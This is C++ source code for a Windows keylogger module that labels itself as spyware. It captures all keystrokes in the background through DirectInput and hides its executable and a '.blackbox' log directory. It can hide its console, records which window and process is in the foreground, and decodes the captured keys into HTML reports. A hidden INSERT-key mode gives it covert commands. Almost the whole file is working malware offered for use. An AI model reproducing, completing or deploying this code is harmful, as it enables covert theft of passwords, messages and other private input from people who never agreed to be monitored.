/*
	Tensor Keylogger Module (formely, Driver Level Input Retriever [DLIRever])
	Family: Spyware
	Purpose: Keylogger
	Responsible: Michael Leocádio

	Check Changelog.txt and TODO.txt for more information on this module.
*/

#define DIRECTINPUT_VERSION								0x0800

#include <dinput.h>										// DirectX (DirectInput) component
#include <ctime>										// For random file name generation with srand()
#include <mmsystem.h>									// For playing audio file
#include <Psapi.h>										// Process Status API (for ForeFocus)

#include "..\kernel\kernel.h"
using namespace QuartzKernel;

#pragma comment(lib, "dinput8.lib")
#pragma comment(lib, "dxguid.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "psapi.lib")

#define					DELIREVER_VERSION				"ALPHA 7 [FROM 12/JUNE/2017]"

LPDIRECTINPUT			lpdi;							// Pointer to DI object
LPDIRECTINPUTDEVICE8	lpdiKeyboard;					// Pointer to DI keyboard (device)
HANDLE					hDIEvent;						// Press/release event
DWORD					dwDITrigger;					// DI event receiver
#define					KEYBOARD_BUFFER_SIZE 2			// Number of events in buffer
DIDEVICEOBJECTDATA		rgdod[KEYBOARD_BUFFER_SIZE];	// Receives event data (input)
int						nLostCount;						// Number of missed inputs (due to device acquisition lost)
int						nDetectCount;					// Number of detected inputs (not necessarily flushed to disk)

HRESULT					hresult;						// Used for WINAPI function returns
DWORD					dwLastError;					// Used for GetLastError()

bool					bOnFlyCommand;					// OnFly Command mode flag
DWORD					dwCommandBuffer;				// Holds OnFly command input

#define					WORK_DIRECTORY					".blackbox"
#define					DATAFILE_NAME_SIZE				8	// 8.3 convention
LPTSTR					DATAFILE_EXTENSION = ".RAW";
LPTSTR					DECODED_EXTENSION = ".HTM";

TCHAR					wcCurrentFileName[DATAFILE_NAME_SIZE + 5];
HANDLE					hCurrentFile;					// Current file used to store input
HANDLE					hLogFile;						// Used for persistent logging
WIN32_FIND_DATA			fileDataStruct;					// Used to store file information

LPTSTR					LOG_FILENAME = "RUNTIME.LOG";

HANDLE					hConsole;						// Console handle
bool					bVisibleConsole = true;			// Deactivate for Release

HANDLE					hFocusEvent;					// Window focus event object
DWORD					dwFocusTrigger;					// Window focus event receiver
TCHAR					lpPrevWindowTitle[MAX_PATH];
TCHAR					lpWindowTitle[MAX_PATH];
TCHAR					lpForeModuleName[MAX_PATH];		// Foreground process executable name
bool					bForeFocusSucceeded;			// If ForeFocus setup was not OK, main loop skips it

void _EndRuntime(void);
void _InitDirectInputInterface(void);
void _VerifyDirectInputCallResult(void);
void _VerifyEvent(void);
void _GenerateFileName(void);
void _FlushRetrievedInput(void);
void _ExecuteExternalCommand(void);
void _NewDataFile(void);
void _CloseCurrentFile(void);
void _FetchBlackbox(void);
void _DecodeRawDatafile(LPTSTR);
LPCSTR _HTMLTranslatePair(int);
void _HTMLBegin(HANDLE);
void _HTMLEnd(HANDLE);
DWORD WINAPI _ForeFocus(LPVOID);
bool _SetForeFocus(void);

// Module entry point
//__declspec(dllexport) DWORD WINAPI _InitModule(LPVOID lpParam)
void main()
{
	atexit(_EndRuntime);

	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	if (!bVisibleConsole) ShowWindow(GetConsoleWindow(), SW_HIDE);

	// Check for single instance
	HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, NULL, "DLIRever");
	if (!hMutex == NULL) {
		HIO::Output("MODULE ALREADY EXECUTING", HIO::YELLOW, hLogFile);
		Sleep(1000);
		exit(EXIT_SUCCESS);
	}
	else {
		CreateMutex(NULL, NULL, "DLIRever");
	}

	TCHAR exename[MAX_PATH];
	GetModuleFileName(NULL, exename, MAX_PATH);
	SetFileAttributes(exename, FILE_ATTRIBUTE_HIDDEN);

	CreateDirectory(WORK_DIRECTORY, NULL);
	SetFileAttributes(WORK_DIRECTORY, FILE_ATTRIBUTE_HIDDEN);
	SetCurrentDirectory(WORK_DIRECTORY);

	// Open log file
	bool bLogExists;
	hLogFile = FindFirstFile(LOG_FILENAME, &fileDataStruct);
	if (hLogFile == INVALID_HANDLE_VALUE) bLogExists = false;
	else bLogExists = true;
	hLogFile = CreateFile(LOG_FILENAME,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	SetFilePointer(hLogFile, NULL, NULL, FILE_END);
	if (bLogExists) WriteFile(hLogFile, "\r\n\r\n\r\n", 6, NULL, NULL);

	HIO::Output("\r\n[MODULE EXECUTED]", HIO::WHITE, hLogFile);
	HIO::Output("\r\n\tVERSION: ", HIO::GRAY, hLogFile);
	HIO::Output(DELIREVER_VERSION, HIO::GRAY, hLogFile);

	if (bVisibleConsole) {
		HIO::Output("\r\nWARNING: VISIBLE CONSOLE AT STARTUP", HIO::DARKYELLOW, hLogFile);
	}

	_NewDataFile();

	_InitDirectInputInterface();

	nLostCount = 0;
	nDetectCount = 0;
	bOnFlyCommand = false;

	// ForeFocus setup
	bForeFocusSucceeded = _SetForeFocus();

	HIO::Output("\r\n[INITIALIZING DONE; LAUNCH]", HIO::WHITE, hLogFile);

	while (true)
	{
		dwDITrigger = WaitForSingleObject(hDIEvent, 1);
		if (dwDITrigger == WAIT_OBJECT_0) {
			_VerifyEvent();
		}

		if (bForeFocusSucceeded) {
			dwFocusTrigger = WaitForSingleObject(hFocusEvent, 1);
			if (dwFocusTrigger == WAIT_OBJECT_0) {
				HIO::Output("\r\nFOREFOCUS: ", HIO::CYAN);
				HIO::Output(lpWindowTitle, HIO::DARKCYAN);
				HIO::Output(lpForeModuleName, HIO::GRAY);
			}
		}
	}
}

bool _SetForeFocus(void)
{
	HIO::Output("\r\nSETTING FOREFOCUS... ", HIO::WHITE, hLogFile);
	hFocusEvent = CreateEvent(NULL, false, false, "ForeFocus");
	if (hFocusEvent != NULL) {
		HANDLE hForeFocusThread = CreateThread(NULL, 0, _ForeFocus, NULL, 0, NULL);
		if (hForeFocusThread != NULL) {
			HIO::Output("DONE", HIO::GREEN, hLogFile);
			return true;
		}
		else {
			HIO::Output("FAILED TO SET FOREFOCUS THREAD", HIO::YELLOW, hLogFile);
			return false;
		}
	}
	else {
		HIO::Output("FAILED TO SET FOREFOCUS EVENT RECEIVER", HIO::YELLOW, hLogFile);
		return false;
	}
}

DWORD WINAPI _ForeFocus(LPVOID lpParameter)
{
	HANDLE	hEvent = OpenEvent(EVENT_MODIFY_STATE, false, "ForeFocus");
	HANDLE	hProcess;
	DWORD	dwProcessId;

	while (true) {
		// Get current active window title
		HWND hwnd = GetForegroundWindow();

		if (hwnd != NULL) {
			GetWindowText(hwnd, lpWindowTitle, MAX_PATH);

			// Check against previous window title
			if (strcmp(lpWindowTitle, lpPrevWindowTitle) != 0) {
				// Window title has changed; set event and update previous title

				strcpy_s(lpPrevWindowTitle, lpWindowTitle);

				// Get module name of active process
				GetWindowThreadProcessId(hwnd, &dwProcessId);
				hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, dwProcessId);
				if (hProcess != NULL) {
					dwLastError = GetProcessImageFileName(hProcess, lpForeModuleName, MAX_PATH);
					if (dwLastError == 0) {
						strcpy_s(lpForeModuleName, "FAILED TO RETRIEVE MODULE NAME");
					}
				}
				else {
					strcpy_s(lpForeModuleName, "FAILED TO OPEN PROCESS");
				}
				SetEvent(hEvent);
			}
			hwnd = NULL;
		}
		Sleep(1); // CPU saver	
	}
	return 0;
}

void _GenerateFileName(void)
{
	// Generates a exclusive random file name
	LPCSTR charset = "0123456789ABCDEF"; // Hexadecimal like

	do {
		srand((unsigned int)time(NULL));
		for (int i = 0; i < DATAFILE_NAME_SIZE; i++) {
			wcCurrentFileName[i] = charset[rand() % strlen(charset)];
		}

		for (int i = DATAFILE_NAME_SIZE, j = 0; i < (DATAFILE_NAME_SIZE + 4); i++, j++) {
			wcCurrentFileName[i] = DATAFILE_EXTENSION[j];
		}

		// We secure the file does not already exist.
		hCurrentFile = FindFirstFile(wcCurrentFileName, &fileDataStruct);
	} while (hCurrentFile != INVALID_HANDLE_VALUE);
}

void _VerifyDirectInputCallResult(void)
{
	switch (hresult)
	{
	case (DI_OK): //  || DI_BUFFEROVERFLOW || DI_PROPNOEFFECT || DI_POLLEDDEVICE
		HIO::Output("DI_OK", HIO::DARKGREEN, hLogFile);
		break;

		// Reaquire device if lost
	case (DIERR_INPUTLOST):
		HIO::Output("DIERR_INPUTLOST; TRYING REAQUISITION...", HIO::DARKYELLOW, hLogFile);
		lpdiKeyboard->Acquire();
		break;

	default:
		HIO::Output("ERROR CODE ", HIO::DARKRED, hLogFile);
		HIO::Output(MAKEINTRESOURCE(GetLastError()), HIO::DARKRED, hLogFile);
		exit(EXIT_FAILURE);
	};
}

void _InitDirectInputInterface(void)
{
	HIO::Output("\r\nINITIALIZING DIRECTX COMPONENT...", HIO::WHITE, hLogFile);

	HIO::Output("\r\nIDIRECTINPUTOBJECT:\t\t\t", HIO::GRAY, hLogFile);
	// IDirectInput object
	hresult = DirectInput8Create(GetModuleHandle(NULL), DIRECTINPUT_VERSION, IID_IDirectInput8, (LPVOID*)&lpdi, NULL);
	_VerifyDirectInputCallResult();

	// Device object
	HIO::Output("\r\nDEVICE OBJECT:\t\t\t\t", HIO::GRAY, hLogFile);
	hresult = lpdi->CreateDevice(GUID_SysKeyboard, (LPDIRECTINPUTDEVICE*)&lpdiKeyboard, NULL);
	_VerifyDirectInputCallResult();

	// Set device data format
	HIO::Output("\r\nSET DEVICE DATA FORMAT:\t\t\t", HIO::GRAY, hLogFile);
	hresult = lpdiKeyboard->SetDataFormat(&c_dfDIKeyboard);
	_VerifyDirectInputCallResult();

	// Set device cooperative level
	HIO::Output("\r\nSET DEVICE COOPERATIVE LEVEL:\t\t", HIO::GRAY, hLogFile);
	hresult = lpdiKeyboard->SetCooperativeLevel(GetDesktopWindow(), DISCL_BACKGROUND | DISCL_NONEXCLUSIVE);
	_VerifyDirectInputCallResult();

	// Set device properties
	HIO::Output("\r\nSET DEVICE PROPERTIES:\t\t\t", HIO::GRAY, hLogFile);
	DIPROPDWORD dipdw;
	dipdw.diph.dwSize = sizeof(DIPROPDWORD);
	dipdw.diph.dwHeaderSize = sizeof(DIPROPHEADER);
	dipdw.diph.dwObj = 0;
	dipdw.diph.dwHow = DIPH_DEVICE;
	dipdw.dwData = KEYBOARD_BUFFER_SIZE;
	hresult = lpdiKeyboard->SetProperty(DIPROP_BUFFERSIZE, &dipdw.diph);
	_VerifyDirectInputCallResult();

	// Set event receiver
	HIO::Output("\r\nSET EVENT RECEIVER:\t\t\t", HIO::GRAY, hLogFile);
	hDIEvent = CreateEvent(NULL, false, false, NULL);
	hresult = lpdiKeyboard->SetEventNotification(hDIEvent);
	_VerifyDirectInputCallResult();

	// Acquire device
	HIO::Output("\r\nACQUIRE DEVICE:\t\t\t\t", HIO::GRAY, hLogFile);
	hresult = lpdiKeyboard->Acquire();
	_VerifyDirectInputCallResult();
}

void _VerifyEvent(void)
{
	DWORD dwItems = 1;

	hresult = lpdiKeyboard->GetDeviceData(sizeof(DIDEVICEOBJECTDATA), rgdod, &dwItems, 0);
	if (SUCCEEDED(hresult)) {
		if (rgdod[0].dwData != 0) {

			nDetectCount++;
			_FlushRetrievedInput();

			// If key is INSERT enter in fly-command mode (if not already)
			if (rgdod[0].dwOfs == 210 && !bOnFlyCommand) {
				// We are now in fly-command
				bOnFlyCommand = true;
				HIO::Output("\r\nONFLY-COMMAND MODE: ", HIO::WHITE, hLogFile);
				TCHAR wcBuff[8];
				_itoa_s(bOnFlyCommand, wcBuff, 10);
				HIO::Output(wcBuff, HIO::GRAY, hLogFile);
			}

			// If in fly-command mode and the key was not INSERT
			else if (bOnFlyCommand && rgdod[0].dwOfs != 210) {
				// Insert key into command buffer
				dwCommandBuffer = rgdod[0].dwOfs;
			}

			else if (bOnFlyCommand && rgdod[0].dwOfs == 210) {
				// Fly-command exit requested
				bOnFlyCommand = false;
				HIO::Output("\r\nONFLY-COMMAND MODE: ", HIO::WHITE, hLogFile);
				TCHAR wcBuff[8];
				_itoa_s(bOnFlyCommand, wcBuff, 10);
				HIO::Output(wcBuff, HIO::GRAY, hLogFile);
				_ExecuteExternalCommand();

				// Reset command buffer
				dwCommandBuffer = NULL;
				rgdod[0].dwOfs = NULL;
			}
		}
	}
	else {
		// Input lost; verify device acquisition
		nLostCount++;
		_VerifyDirectInputCallResult();
	}
}

void _FlushRetrievedInput(void)
{
	CHAR data[3];
	sprintf_s(data, sizeof(data), "%02X", rgdod[0].dwOfs);
	WriteFile(hCurrentFile, data, strlen(data), NULL, NULL);

	HIO::Output("\r\n\tINPUT FLUSHED: ", HIO::GRAY);
	TCHAR wcBuff[8];
	_itoa_s(rgdod[0].dwOfs, wcBuff, 16);
	_strupr_s(wcBuff);
	HIO::Output(wcBuff, HIO::DARKCYAN, false);
}

void _ExecuteExternalCommand(void)
{
	// Recognize input string
	switch (dwCommandBuffer) {

	case DIK_F2:	// REVEAL - Play short sound
		HIO::Output("\r\nCOMMAND RECOGNIZED: FUNCTION 2", HIO::BLUE, hLogFile);
		//Beep(500, 1000);
		//MessageBeep(MB_OK);
		//MessageBox(GetDesktopWindow(, L"", L"", MB_OK);
		//PlaySound(L"R2D2.wav", GetModuleHandle(NULL, SND_RESOURCE | SND_ASYNC);
		PlaySound("R2D2.wav", NULL, SND_FILENAME | SND_ASYNC);
		break;

	case DIK_F5:	// REFRESH - Use new datafile
		HIO::Output("\r\nCOMMAND RECOGNIZED: FUNCTION 5", HIO::BLUE, hLogFile);
		_NewDataFile();
		break;

	case DIK_F7:	// CONSOLE
		HIO::Output("\r\nCOMMAND RECOGNIZED: FUNCTION 7", HIO::BLUE, hLogFile);
		if (bVisibleConsole) {
			ShowWindow(GetConsoleWindow(), SW_HIDE);
			bVisibleConsole = false;
		}
		else {
			ShowWindow(GetConsoleWindow(), SW_SHOW);
			bVisibleConsole = true;
		}
		break;

	case DIK_F9:	// DECODE - Translate blackbox
		HIO::Output("\r\nCOMMAND RECOGNIZED: FUNCTION 9", HIO::BLUE, hLogFile);
		_FetchBlackbox();
		break;

	case DIK_F12:	// EXIT - Exit program
		HIO::Output("\r\nCOMMAND RECOGNIZED: FUNCTION 12", HIO::BLUE, hLogFile);
		_EndRuntime();
		ExitThread(EXIT_SUCCESS);
		break;

	default:
		break;
	}
}

void _EndRuntime(void)
{
	HIO::Output("\r\n[END OF RUNTIME TRIGGERED]", HIO::DARKYELLOW, hLogFile);

	if (lpdi) {
		lpdiKeyboard->Unacquire();
		lpdiKeyboard->Release();

		lpdi->Release();
	}

	if (hCurrentFile) {
		_CloseCurrentFile();
	}

	if (hLogFile) {
		HIO::Output("\r\nDETECT COUNT: ", HIO::GRAY, hLogFile);
		TCHAR n[8];
		_itoa_s(nDetectCount, n, 10);
		HIO::Output(n, HIO::GRAY, hLogFile);

		HIO::Output("\r\nLOST COUNT: ", HIO::GRAY, hLogFile);
		_itoa_s(nLostCount, n, 10);
		HIO::Output(n, HIO::GRAY, hLogFile);

		CloseHandle(hLogFile);
	}

	Sleep(3000);
}

void _NewDataFile(void)
{
	HIO::Output("\r\nGENERATING NEW DATAFILE... ", HIO::WHITE, hLogFile);

	_CloseCurrentFile();
	_GenerateFileName();

	hCurrentFile = CreateFile(wcCurrentFileName,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	HIO::Output("DONE: ", HIO::WHITE, hLogFile);
	HIO::Output(wcCurrentFileName, HIO::MAGENTA, hLogFile);
}

void _CloseCurrentFile(void)
{
	if (hCurrentFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hCurrentFile);
		hCurrentFile = INVALID_HANDLE_VALUE;
	}
}

void _FetchBlackbox(void)
{
	HIO::Output("\r\nBLACKBOX DECODING INITIATED", HIO::DARKBLUE, hLogFile);
	int filecount = 0;

	_CloseCurrentFile();

	hCurrentFile = FindFirstFile("./*.RAW", &fileDataStruct);
	if (hCurrentFile != INVALID_HANDLE_VALUE) {
		do {
			filecount++;

			// Decode
			_DecodeRawDatafile(fileDataStruct.cFileName);

		} while (FindNextFile(hCurrentFile, &fileDataStruct) != false);
		FindClose(hCurrentFile);
		hCurrentFile = INVALID_HANDLE_VALUE;

		TCHAR wcBuff[8];
		_itoa_s(filecount, wcBuff, 10);
		HIO::Output("\r\n");
		HIO::Output(wcBuff, HIO::GRAY, hLogFile);
		HIO::Output(" DATAFILE(S) FETCHED", HIO::DARKBLUE, hLogFile);

		_NewDataFile();
	}
	else {
		HIO::Output("\r\nFAILED TO FETCH WORK DIRECTORY", HIO::DARKRED, hLogFile);

		_NewDataFile();
	}
}

void _DecodeRawDatafile(LPTSTR f)
{
	// Create output file
	TCHAR fcopy[DATAFILE_NAME_SIZE + 5];
	strcpy_s(fcopy, f);
	for (int i = DATAFILE_NAME_SIZE, j = 0; i < (DATAFILE_NAME_SIZE + 4); i++, j++) {
		fcopy[i] = DECODED_EXTENSION[j];
	}
	HANDLE hTranslateFile = CreateFile(fcopy,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	// Create a temporary handle for the file to be translated (since the global handle is busy at this point)
	HANDLE hRawFile = CreateFile(f,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	HIO::Output("\r\n\tTRANSLATING INTO ", HIO::DARKBLUE, hLogFile);
	HIO::Output(fcopy, HIO::DARKMAGENTA, hLogFile);
	HIO::Output(":\t", HIO::DARKBLUE, hLogFile);

	_HTMLBegin(hTranslateFile);

	// Fetch each non-space word until end of file
	CHAR pair[3];
	CHAR data[64];
	DWORD bReads;
	while (true) {
		// Check EOF
		if (ReadFile(hRawFile, pair, 2, &bReads, NULL) == (BOOL)true && bReads == 0) { break; }

		strcpy_s(data, sizeof(data), _HTMLTranslatePair(strtoul(pair, NULL, 16)));
		WriteFile(hTranslateFile, data, strlen(data), NULL, NULL);
	}

	_HTMLEnd(hTranslateFile);

	CloseHandle(hTranslateFile);
	CloseHandle(hRawFile);
	DeleteFile(f);

	HIO::Output("DONE", HIO::DARKGREEN, hLogFile);
}

LPCSTR _HTMLTranslatePair(int p)
{
	switch (p) {
	case DIK_ESCAPE:			return "<div class=\"control\">ESC</div>";				break;
	case DIK_1:					return "1";												break;
	case DIK_2:					return "2";												break;
	case DIK_3:					return "3";												break;
	case DIK_4:					return "4";												break;
	case DIK_5:					return "5";												break;
	case DIK_6:					return "6";												break;
	case DIK_7:					return "7";												break;
	case DIK_8:					return "8";												break;
	case DIK_9:					return "9";												break;
	case DIK_0:					return "0";												break;
	case DIK_MINUS:				return "-";												break;
	case DIK_EQUALS:			return "=";												break;
	case DIK_BACK:				return "<div class=\"control\">BKSP</div>";				break;
	case DIK_TAB:				return "<div class=\"control\">TAB</div>";				break;
	case DIK_Q:					return "Q";												break;
	case DIK_W:					return "W";												break;
	case DIK_E:					return "E";												break;
	case DIK_R:					return "R";												break;
	case DIK_T:					return "T";												break;
	case DIK_Y:					return "Y";												break;
	case DIK_U:					return "U";												break;
	case DIK_I:					return "I";												break;
	case DIK_O:					return "O";												break;
	case DIK_P:					return "P";												break;
	case DIK_LBRACKET:			return "<div class=\"control\">LBRACKET</div>";			break;
	case DIK_RBRACKET:			return "<div class=\"control\">RBRACKET</div>";			break;
	case DIK_RETURN:			return "<br />";										break;
	case DIK_LCONTROL:			return "<div class=\"control\">LCTRL</div>";			break;
	case DIK_A:					return "A";												break;
	case DIK_S:					return "S";												break;
	case DIK_D:					return "D";												break;
	case DIK_F:					return "F";												break;
	case DIK_G:					return "G";												break;
	case DIK_H:					return "H";												break;
	case DIK_J:					return "J";												break;
	case DIK_K:					return "K";												break;
	case DIK_L:					return "L";												break;
	case DIK_SEMICOLON:			return ";";												break;
	case DIK_APOSTROPHE:		return "'";												break;
	case DIK_GRAVE:				return "<div class=\"control\">GRAVE</div>";			break;
	case DIK_LSHIFT:			return "<div class=\"control\">LSHIFT</div>";			break;
	case DIK_BACKSLASH:			return "\\";											break;
	case DIK_Z:					return "Z";												break;
	case DIK_X:					return "X";												break;
	case DIK_C:					return "C";												break;
	case DIK_V:					return "V";												break;
	case DIK_B:					return "B";												break;
	case DIK_N:					return "N";												break;
	case DIK_M:					return "M";												break;
	case DIK_COMMA:				return ",";												break;
	case DIK_PERIOD:			return ".";												break;
	case DIK_SLASH:				return "/";												break;
	case DIK_RSHIFT:			return "<div class=\"control\">RSHIFT</div>";			break;
	case DIK_MULTIPLY:			return "*";												break;
	case DIK_LMENU:				return "<div class=\"control\">LALT</div>";				break;
	case DIK_SPACE:				return " ";												break;
	case DIK_CAPITAL:			return "<div class=\"control\">CAPSL</div>";			break;
	case DIK_F1:				return "<div class=\"control\">F1</div>";				break;
	case DIK_F2:				return "<div class=\"control\">F2</div>";				break;
	case DIK_F3:				return "<div class=\"control\">F3</div>";				break;
	case DIK_F4:				return "<div class=\"control\">F4</div>";				break;
	case DIK_F5:				return "<div class=\"control\">F5</div>";				break;
	case DIK_F6:				return "<div class=\"control\">F6</div>";				break;
	case DIK_F7:				return "<div class=\"control\">F7</div>";				break;
	case DIK_F8:				return "<div class=\"control\">F8</div>";				break;
	case DIK_F9:				return "<div class=\"control\">F9</div>";				break;
	case DIK_F10:				return "<div class=\"control\">F10</div>";				break;
	case DIK_NUMLOCK:			return "<div class=\"control\">NLOCK</div>";			break;
	case DIK_SCROLL:			return "<div class=\"control\">SCROLL</div>";			break;
	case DIK_NUMPAD7:			return "7";												break;
	case DIK_NUMPAD8:			return "8";												break;
	case DIK_NUMPAD9:			return "9";												break;
	case DIK_SUBTRACT:			return "-";												break;
	case DIK_NUMPAD4:			return "4";												break;
	case DIK_NUMPAD5:			return "5";												break;
	case DIK_NUMPAD6:			return "6";												break;
	case DIK_ADD:				return "+";												break;
	case DIK_NUMPAD1:			return "1";												break;
	case DIK_NUMPAD2:			return "2";												break;
	case DIK_NUMPAD3:			return "3";												break;
	case DIK_NUMPAD0:			return "0";												break;
	case DIK_DECIMAL:			return ".";												break;
	case DIK_OEM_102:			return "<div class=\"control\">OEM102</div>";			break;
	case DIK_F11:				return "<div class=\"control\">F11</div>";				break;
	case DIK_F12:				return "<div class=\"control\">F12</div>";				break;
	case DIK_F13:				return "<div class=\"control\">F13</div>";				break;
	case DIK_F14:				return "<div class=\"control\">F14</div>";				break;
	case DIK_F15:				return "<div class=\"control\">F15</div>";				break;
	case DIK_ABNT_C1:			return "?";												break;
	case DIK_ABNT_C2:			return ".";												break;
	case DIK_NUMPADEQUALS:		return "=";												break;
	case DIK_AT:				return "<div class=\"control\">AT</div>";				break;
	case DIK_COLON:				return ":";												break;
	case DIK_UNDERLINE:			return "_";												break;
	case DIK_STOP:				return "<div class=\"control\">STOP</div>";				break;
	case DIK_UNLABELED:			return "<div class=\"control\">UNLABELED</div>";		break;
	case DIK_NEXTTRACK:			return "<div class=\"control\">NEXTTRACK</div>";		break;
	case DIK_NUMPADENTER:		return "<br />";										break;
	case DIK_RCONTROL:			return "<div class=\"control\">RCTRL</div>";			break;
	case DIK_MUTE:				return "<div class=\"control\">MUTE</div>";				break;
	case DIK_CALCULATOR:		return "<div class=\"control\">CALC</div>";				break;
	case DIK_PLAYPAUSE:			return "<div class=\"control\">PLAYPAUSE</div>";		break;
	case DIK_MEDIASTOP:			return "<div class=\"control\">MEDIASTOP</div>";		break;
	case DIK_VOLUMEDOWN:		return "<div class=\"control\">VOLDOWN</div>";			break;
	case DIK_VOLUMEUP:			return "<div class=\"control\">VOLUP</div>";			break;
	case DIK_WEBHOME:			return "<div class=\"control\">WEBHOME</div>";			break;
	case DIK_NUMPADCOMMA:		return ",";												break;
	case DIK_DIVIDE:			return "/";												break;
	case DIK_SYSRQ:				return "<div class=\"control\">SYSRQ</div>";			break;
	case DIK_RMENU:				return "<div class=\"control\">RALT</div>";				break;
	case DIK_PAUSE:				return "<div class=\"control\">PAUSE</div>";			break;
	case DIK_HOME:				return "<div class=\"control\">HOME</div>";				break;
	case DIK_UP:				return "<div class=\"control\">UP</div>";				break;
	case DIK_PRIOR:				return "<div class=\"control\">PGUP</div>";				break;
	case DIK_LEFT:				return "<div class=\"control\">LEFT</div>";				break;
	case DIK_RIGHT:				return "<div class=\"control\">RIGHT</div>";			break;
	case DIK_END:				return "<div class=\"control\">END</div>";				break;
	case DIK_DOWN:				return "<div class=\"control\">DOWN</div>";				break;
	case DIK_NEXT:				return "<div class=\"control\">PGDOWN</div>";			break;
	case DIK_INSERT:			return "<div class=\"control\">INSERT</div>";			break;
	case DIK_DELETE:			return "<div class=\"control\">DELETE</div>";			break;
	case DIK_LWIN:				return "<div class=\"control\">LWIN</div>";				break;
	case DIK_RWIN:				return "<div class=\"control\">RWIN</div>";				break;
	case DIK_APPS:				return "<div class=\"control\">APPS</div>";				break;
	case DIK_POWER:				return "<div class=\"control\">POWER</div>";			break;
	case DIK_SLEEP:				return "<div class=\"control\">SLEEP</div>";			break;
	case DIK_WAKE:				return "<div class=\"control\">WAKE</div>";				break;
	case DIK_WEBSEARCH:			return "<div class=\"control\">WEBSRCH</div>";			break;
	case DIK_WEBFAVORITES:		return "<div class=\"control\">WEBFAVS</div>";			break;
	case DIK_WEBREFRESH:		return "<div class=\"control\">WEBRFSH</div>";			break;
	case DIK_WEBSTOP:			return "<div class=\"control\">WEBSTOP</div>";			break;
	case DIK_WEBFORWARD:		return "<div class=\"control\">WEBFWRD</div>";			break;
	case DIK_WEBBACK:			return "<div class=\"control\">WEBBACK</div>";			break;
	case DIK_MYCOMPUTER:		return "<div class=\"control\">MYCOMPUTER</div>";		break;
	case DIK_MAIL:				return "<div class=\"control\">MAIL</div>";				break;
	case DIK_MEDIASELECT:		return "<div class=\"control\">MEDIASELECT</div>";		break;

	default:					return "<div class=\"control\">UNKOWN</div>";
	}
}

void _HTMLBegin(HANDLE h)
{
	CHAR htmlcode[] = "<html><head><style>body{background-color:#212121;color:gainsboro;font-family:monospace;padding:0;margin:1px}div{display:inline;margin:1px;}div.control{background-color:#424242;color:#212121;}</style></head><body>";

	WriteFile(h, htmlcode, sizeof(htmlcode), NULL, NULL);
}

void _HTMLEnd(HANDLE h)
{
	CHAR htmlcode[] = "</body>";

	WriteFile(h, htmlcode, sizeof(htmlcode), NULL, NULL);
}